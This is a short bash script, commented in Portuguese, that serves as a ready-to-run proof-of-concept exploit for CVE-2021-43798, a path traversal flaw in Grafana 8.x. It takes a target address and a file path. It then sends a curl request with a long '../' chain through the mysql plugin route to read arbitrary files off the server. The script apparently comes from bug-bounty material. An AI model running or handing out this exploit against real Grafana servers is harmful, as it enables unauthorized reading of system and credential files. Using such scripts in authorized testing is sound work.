#!/bin/bash
# CVE-2021-43798
# Script para testar pela vulnerabilidade de LFI no Grafana 8.x
#
# Obrigado Halim Jabbes pelo script
# Fonte: https://www.linkedin.com/posts/hxlxmj_bugbountytips-bugbountytricks-activity-7183715618251022337-7HZA


VERDE='\033[0;32m'
LARANJA='\033[0;33m'
BRANCO='\033[0m'

alvo="$1"
arquivo="$2"

EXP() {
        echo -e "${VERDE}[+] Iniciando o ataque: ${BRANCO}$alvo"
        echo -e "${LARANJA}[+] Exploit PoC :"
        curl -k --path-as-is "http://$alvo/public/plugins/mysql/../../../../../../../../../../../../../../../../../../../../../..$arquivo" --connect-timeout 10 2>/dev/null | sed 's/^/\x1b[31m/;s/$/\x1b[0m/'
}

if [[ -z $arquivo || -z $alvo ]]
then
        echo -e "${VERDE}Forma de uso:"
        echo -e "$(echo $0 | rev | cut -d '/' -f1 | rev) <ip>:<porta> arquivo"
else
        EXP
fi
